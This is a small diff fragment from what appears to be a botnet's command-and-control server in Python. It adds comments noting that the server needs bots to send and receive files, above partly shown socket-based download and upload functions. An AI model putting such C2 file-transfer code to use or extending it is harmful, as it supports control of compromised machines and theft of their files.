@@ -16,6 +16,7 @@ socks = []
 clients = []
 active = False
 
+# CnC requires bot to send file
 def download(sock, file):
     try:
         f = open(file, 'wb')
@@ -30,6 +31,7 @@ def download(sock, file):
     f.write(d)
     f.close()
 
+# CnC requires bot to receive file
 def upload(sock, file):
     try:
         f = open(file, 'rb')
